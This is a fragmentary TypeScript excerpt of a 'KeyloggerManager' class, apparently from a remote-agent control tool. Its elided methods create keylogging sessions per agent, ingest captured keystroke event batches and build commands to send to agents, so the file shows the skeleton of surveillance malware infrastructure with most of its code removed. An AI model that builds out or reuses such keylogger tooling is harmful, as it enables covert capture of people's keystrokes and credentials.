...
export class KeyloggerManager {
        ...
        createSession(agentId: string, config: KeyloggerStartConfig, sessionId?: string): KeyloggerSessionState {
        ...
        ingest(agentId: string, envelope: KeyloggerEventEnvelope): KeyloggerTelemetryState {
                ...
                const session = this.sessions.get(agentId);
                if (session) {
                        session.state.totalEvents = envelope.totalEvents ?? session.state.totalEvents + envelope.events.length;
        ...
        buildCommand(action: KeyloggerCommandPayload['action'], session: KeyloggerSessionState): KeyloggerCommandPayload {
                return {
                        action,
